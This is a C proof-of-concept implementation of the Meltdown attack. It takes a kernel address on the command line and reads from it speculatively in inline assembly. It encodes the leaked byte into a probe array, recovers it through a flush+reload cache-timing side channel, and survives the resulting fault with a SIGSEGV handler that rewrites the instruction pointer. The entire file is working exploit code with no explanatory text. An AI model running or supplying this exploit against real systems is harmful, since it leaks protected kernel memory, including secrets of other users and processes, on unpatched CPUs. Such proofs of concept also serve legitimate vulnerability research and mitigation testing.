#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <signal.h>
#include <stdint.h>
#include <string.h>
#include <malloc.h>
#include <setjmp.h>
#include <ucontext.h>
#include <sched.h>
#include <math.h>
#include <x86intrin.h>
#include <fcntl.h>


#define BYTE 0x100
#define PAGE_SIZE 4096 
typedef unsigned long kaddr_t; 
volatile uint8_t secret = 0xff;
extern char stopmeltdown[];
static char target_array[BYTE * PAGE_SIZE];

static inline void clflush(volatile void *p) {
	asm volatile("clflush (%0)" :: "r"(p));
}

static inline uint64_t rdtsc() {
	unsigned long a, d;
	asm volatile("cpuid; rdtsc" : "=a" (a), "=d"(d) :: "ebx", "ecx");
	return a | ((uint64_t)d << 32);
}

static void pin_cpu0() {
	cpu_set_t mask;
	CPU_ZERO(&mask);
	CPU_SET(0, &mask);
	sched_setaffinity(0, sizeof(cpu_set_t), &mask);
}

static int get_access_time(volatile char *target) {
	unsigned junk;
	unsigned long start, end;
	start = __rdtscp(&junk);
	(void) *target;
	end = __rdtscp(&junk);
	return end-start;
}

static int cache_hit_threshold;
static int hit[BYTE];
void check() {
	int i, time, mix_i;
	volatile char *addr;
	for (i = 0; i < BYTE; i++) {
		mix_i = ((i * 167) + 13) & 255;
		addr = &target_array[mix_i * PAGE_SIZE];
		time = get_access_time(addr);
		if (time <= cache_hit_threshold) {
			hit[mix_i]++;
		}
#if 0
		if (mix_i == 0x76) {
			printf("idx:%02x, t:%d\n", mix_i, time);
		}
#endif
	}
}

#define ESTIMATE_CYCLES	1000000
static void
set_cache_hit_threshold(void)
{
		long cached, uncached, i;
		for (cached = 0, i = 0; i < ESTIMATE_CYCLES; i++)
			cached += get_access_time(target_array);
		for (cached = 0, i = 0; i < ESTIMATE_CYCLES; i++)
			cached += get_access_time(target_array);
		for (uncached = 0, i = 0; i < ESTIMATE_CYCLES; i++) {
			_mm_clflush(target_array);
			_mm_mfence();
			uncached += get_access_time(target_array);
		}
			cached /= ESTIMATE_CYCLES;
			uncached /= ESTIMATE_CYCLES;
			cache_hit_threshold = sqrt(cached * uncached);
			printf("cached = %ld, uncached = %ld, threshold %d\n", cached, uncached, cache_hit_threshold);
}


void sigsegv(int sig, siginfo_t *siginfo, void *context) {
	ucontext_t *ucontext = context;
	ucontext->uc_mcontext.gregs[REG_RIP] = (unsigned long)stopmeltdown;
}

int set_signal(void) {
	struct sigaction act = {
		.sa_sigaction = sigsegv,
		.sa_flags = SA_SIGINFO,
	};
	return sigaction(SIGSEGV, &act, NULL);
}

#if 0
void abort_handler(int signum) {
//	*(uint8_t *)(probe_array + secret * PAGE_SIZE) = 0xff;
	check_access_time(probe_array, BYTE);
	exit(0);
	return;
}	
#endif 

void clflush_array(void) {
	int i;
	for (i = 0; i < BYTE; i++)
		_mm_clflush(&target_array[i * PAGE_SIZE]);
}

static void __attribute__((noinline))
speculate(unsigned long addr)
{
	asm volatile (
		"1:\n\t"

#if 0
		".rept 300\n\t"
		"add $0x141, %%rax\n\t"
		".endr\n\t"
#endif

//		"movzx (%[addr]), %%eax\n\t"
		"xorq %%rax, %%rax\n\t"
		"movb (%[addr]), %%al\n\t"
		"shlq $0xc, %%rax\n\t"
		"jz 1b\n\t"
		"movq (%[target], %%rax, 1), %%rbx\n"

		"stopmeltdown: \n\t"
		"nop\n\t"
		:
		: [target] "r" (target_array),
		  [addr] "r" (addr)
		: "%rax", "%rbx"
	);
}



int main(int argc, char *argv[]) {
//	volatile kaddr_t victim = 0xffffffff81a00060; 
	volatile kaddr_t victim;
	sscanf(argv[1], "%lx", &victim);
	unsigned long start, end, m, j, k, l;
	/* register SEGFAULT handler */
//	signal(SIGSEGV, abort_handler);
	set_signal();
	pin_cpu0();
	memset(target_array, 1, sizeof(target_array));
	set_cache_hit_threshold();
#if 0
	clflush_array();
	m = get_access_time(&target_array[0]);
	j = get_access_time(&target_array[0]);
	k = get_access_time(&target_array[1 * PAGE_SIZE]);
	l = get_access_time(&target_array[2 * PAGE_SIZE]);
	printf("%d %d %d %d\n", m, j, k, l);
#endif

	for (int i = 0; i < 1000; ++i)  {
		clflush_array();
//		_mm_mfence();
		syscall(0, 0, 0, 0);
		/* raise the exception */
		speculate(victim);
		check();
	}

	for (int i = 0; i < BYTE; i++) {
		printf("[%02x]=%d\n", i, hit[i]);
	}
	return 0;		
}
